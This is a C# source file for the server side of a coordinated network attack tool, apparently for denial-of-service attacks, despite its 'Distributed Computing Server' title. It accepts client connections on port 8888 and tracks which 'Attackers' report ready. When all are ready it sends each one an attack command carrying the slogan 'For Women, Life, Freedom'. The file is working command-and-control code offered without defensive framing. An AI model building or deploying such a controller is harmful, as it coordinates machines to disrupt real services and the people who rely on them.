using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;

namespace Server
{
    class Program
    {
        private static Thread threadConsole;
        private static bool attacking = false;
        static Server server;
        static List<Client> clients;
        static void Main(string[] args)
        {
            Console.Title = "Distributed Computing Server";

            server = new Server(8888);
            server.SocketAccepted += new Server.SocketAcceptedHandler(server_SocketAccepted);
            clients = new List<Client>();
            server.Start();

            threadConsole = new Thread(new ThreadStart(ConsoleThread));
            threadConsole.Start();
        }

        static void server_SocketAccepted(Socket e)
        {
            Client client = new Client(e);
            client.Received += new Client.ClientReceivedHandler(client_Received);
            client.Disconnected += new Client.ClientDisconnectedHandler(client_Disconnected);

            attacking = false;

            lock (clients)
            {
                clients.Add(client);
            }

            Console.WriteLine("Client with Address: {0} is Connected.", client.EndPoint);
        }

        static void client_Received(Client sender, byte[] data)
        {
            lock (clients)
            {
                for (int i = 0; i < clients.Count; i++)
                {
                    if (clients[i].ID == sender.ID)
                    {
                        String status = Encoding.Default.GetString(data);
                        if (status == "ready")
                        {
                            clients[i].ReadyToAttack = true;
                        }
                        else
                        {
                            clients[i].ReadyToAttack = false;
                        }
                        break;
                    }
                }
            }
        }

        static void client_Disconnected(Client sender)
        {
            lock (clients)
            {
                for (int i = 0; i < clients.Count; i++)
                {
                    if (clients[i].ID == sender.ID)
                    {
                        Console.WriteLine("Client with Address: {0} is Disconnected.", sender.EndPoint);
                        clients.RemoveAt(i);
                        break;
                    }
                }
            }
        }

        private static void ConsoleThread()
        {
            while (true)
            {
                if (!attacking)
                {
                    bool attackCommand = true;
                    lock (clients)
                    {
                        if (clients.Count > 1)
                        {
                            Console.WriteLine("_________________________________________");
                            Console.WriteLine("Attacker\t\t| State");
                            Console.WriteLine("-----------------------------------------");
                            for (int i = 0; i < clients.Count; i++)
                            {
                                Console.WriteLine("{0}\t\t| {1}", clients[i].EndPoint, (clients[i].ReadyToAttack ? "Ready" : "Not Ready"));
                                if (!clients[i].ReadyToAttack)
                                {
                                    attackCommand = false;
                                }
                            }
                            Console.WriteLine("");
                            Console.WriteLine("");
                        }
                        else
                        {
                            attackCommand = false;
                        }
                    }

                    if (attackCommand)
                    {
                        attacking = true;
                        Console.WriteLine("All Attackers Ready! Command them all to start attacking...");
                        lock (clients)
                        {
                            for (int i = 0; i < clients.Count; i++)
                            {
                                clients[i].AttackCommand("Attack...! For Women, Life, Freedom");
                            }
                        }
                    }
                }
                Thread.Sleep(5000);
            }
        }
    }
}
